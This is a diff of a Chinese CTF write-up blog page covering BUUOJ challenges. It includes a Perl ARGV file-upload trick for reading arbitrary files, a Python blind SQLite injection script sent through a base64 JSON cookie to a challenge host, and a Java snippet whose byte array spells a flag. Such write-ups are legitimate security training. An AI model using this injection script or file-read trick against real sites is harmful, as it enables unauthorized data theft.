@@ -35,7 +35,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/07/11/vacation2/3.png">
 <meta property="og:image" content="http://yoursite.com/2020/07/11/vacation2/4.png">
 <meta property="article:published_time" content="2020-07-11T06:07:12.000Z">
-<meta property="article:modified_time" content="2020-07-13T09:02:31.969Z">
+<meta property="article:modified_time" content="2020-07-14T05:10:27.674Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="buu">
 <meta name="twitter:card" content="summary">
@@ -224,7 +224,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-07-13 17:02:31" itemprop="dateModified" datetime="2020-07-13T17:02:31+08:00">2020-07-13</time>
+                <time title="Modified: 2020-07-14 13:10:27" itemprop="dateModified" datetime="2020-07-14T13:10:27+08:00">2020-07-14</time>
               </span>
 
           
@@ -243,13 +243,13 @@
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/07/11/vacation2/1.png" class="" title="examplename">
+<img src="/2020/07/11/vacation2/1.png" class="">
 
 <h3 id="BSidesCF-2019-Sequel"><a href="#BSidesCF-2019-Sequel" class="headerlink" title="[BSidesCF 2019]Sequel"></a>[BSidesCF 2019]Sequel</h3><p>打开是登录框，尝试注入报错只能输入字母或数字，应该是弱密码爆破了</p>
-<img src="/2020/07/11/vacation2/2.png" class="" title="examplename">
+<img src="/2020/07/11/vacation2/2.png" class="">
 
 <p>爆出账号和密码都是guest，登录，cookie发生了改变，解码看看</p>
-<img src="/2020/07/11/vacation2/3.png" class="" title="examplename">
+<img src="/2020/07/11/vacation2/3.png" class="">
 
 <p>json形式记录的信息，网页提示admin才能够看到信息，那应该就是要注出admin的账号信息了，开始以为是sql注入，后来怎么都不行，去看了wp，才知道是sqlite注入</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">out = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> string.printable:</span><br><span class="line">        tmp = out + letter</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> letter == <span class="string">'g'</span>: <span class="keyword">continue</span></span><br><span class="line">        payload2 = <span class="string">r'&#123;&#123;"username":"\" OR EXISTS(SELECT name FROM sqlite_master WHERE name LIKE \"&#123;&#125;\" limit 1) OR \"","password":"guest"&#125;&#125;'</span>.format(tmp + <span class="string">'%'</span>)</span><br><span class="line">        payload1 = <span class="string">r'&#123;&#123;"username":"\" OR EXISTS(SELECT password FROM userinfo WHERE password LIKE \"&#123;&#125;\" limit 1) OR \"","password":"guest"&#125;&#125;'</span>.format(tmp + <span class="string">'%'</span>)</span><br><span class="line">        payload3 = <span class="string">r'&#123;&#123;"username":"\" OR EXISTS(SELECT username FROM userinfo WHERE username LIKE \"&#123;&#125;\" limit 1) OR \"","password":"guest"&#125;&#125;'</span>.format(tmp + <span class="string">'%'</span>)</span><br><span class="line"></span><br><span class="line">        payload1 = base64.b64encode(payload1.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        payload2 = base64.b64encode(payload2.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        payload3 = base64.b64encode(payload3.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">        r = requests.get(<span class="string">'http://7e95f711-c309-4bfa-b522-a0be0d9d6b06.node3.buuoj.cn/sequels'</span>, cookies=&#123;<span class="string">"1337_AUTH"</span> : payload1&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Movie"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            out = tmp</span><br><span class="line">            sys.stdout.write(letter)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
@@ -267,7 +267,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] array)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"\u4f17\u6240\u5468\u77e5\uff0c\u4f60\u662f\u4e00\u540dWEB\u9009\u624b\uff0c\u638c\u63e1javaweb\u4e5f\u662f\u4e00\u9879\u5fc5\u5907\u6280\u80fd\uff0c\u90a3\u4e48\u9006\u5411\u4e2ajava\u5e94\u8be5\u4e0d\u8fc7\u5206\u5427\uff1f"</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] array2 = &#123; <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>直接把对应的ascii值转换成字符拼接就是了</p>
-<img src="/2020/07/11/vacation2/4.png" class="" title="examplename">
+<img src="/2020/07/11/vacation2/4.png" class="">
     </div>
 
     
